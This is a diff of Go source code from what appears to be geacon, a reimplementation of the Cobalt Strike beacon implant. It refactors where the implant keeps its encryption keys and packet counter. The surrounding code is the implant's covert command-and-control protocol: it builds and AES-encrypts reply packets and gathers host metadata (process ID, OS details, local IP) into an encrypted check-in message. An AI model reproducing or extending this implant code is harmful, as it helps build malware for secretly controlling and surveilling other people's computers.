@@ -12,6 +12,9 @@ import (
 	"time"
 )
 
+// cmd counter
+var counter = 0
+
 // all of this can be found in beacon.Job class
 const (
 	// IMPORTANT! windows default use codepage 936(GBK)
@@ -81,7 +84,7 @@ func ReadShort(buf *bytes.Buffer) uint16 {
 }
 
 func DecryptPacket(b []byte) []byte {
-	decrypted, err := util.AesCBCDecrypt(b, config.AesKey)
+	decrypted, err := util.AesCBCDecrypt(b, util.AesKey)
 	if err != nil {
 		panic(err)
 	}
@@ -117,10 +120,10 @@ func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
 
 // MakePacket make reply command, return AES encoded data
 func MakePacket(replyType int, b []byte) []byte {
-	config.Counter += 1
+	counter += 1
 	buf := new(bytes.Buffer)
 	counterBytes := make([]byte, 4)
-	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
+	binary.BigEndian.PutUint32(counterBytes, uint32(counter))
 	buf.Write(counterBytes)
 
 	if b != nil {
@@ -136,7 +139,7 @@ func MakePacket(replyType int, b []byte) []byte {
 
 	buf.Write(b)
 
-	encrypted, err := util.AesCBCEncrypt(buf.Bytes(), config.AesKey)
+	encrypted, err := util.AesCBCEncrypt(buf.Bytes(), util.AesKey)
 	if err != nil {
 		return nil
 	}
@@ -171,9 +174,9 @@ func EncryptedMetaInfo() []byte {
 
 func MakeMetaInfo() []byte {
 	util.RandomAESKey()
-	sha256hash := sha256.Sum256(config.GlobalKey)
-	config.AesKey = sha256hash[:16]
-	config.HmacKey = sha256hash[16:]
+	sha256hash := sha256.Sum256(util.GlobalKey)
+	util.AesKey = sha256hash[:16]
+	util.HmacKey = sha256hash[16:]
 
 	clientID = sysinfo.GeaconID()
 	processID := sysinfo.GetPID()
@@ -210,7 +213,7 @@ func MakeMetaInfo() []byte {
 	osInfoBytes = append([]byte{metadataFlag}, osInfoSlicne...)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)
 
-	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
+	metaInfo := util.BytesCombine(util.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
 	metaLen := WritePacketLen(metaInfo)
 	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)
@@ -226,9 +229,9 @@ MetaData for 4.1
 */
 func MakeMetaInfo4plus() []byte {
 	util.RandomAESKey()
-	sha256hash := sha256.Sum256(config.GlobalKey)
-	config.AesKey = sha256hash[:16]
-	config.HmacKey = sha256hash[16:]
+	sha256hash := sha256.Sum256(util.GlobalKey)
+	util.AesKey = sha256hash[:16]
+	util.HmacKey = sha256hash[16:]
 
 	clientID = sysinfo.GeaconID()
 	processID := sysinfo.GetPID()
@@ -303,7 +306,7 @@ func MakeMetaInfo4plus() []byte {
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
 		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
-	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
+	metaInfo := util.BytesCombine(util.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
 	metaLen := WritePacketLen(metaInfo)
 	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)
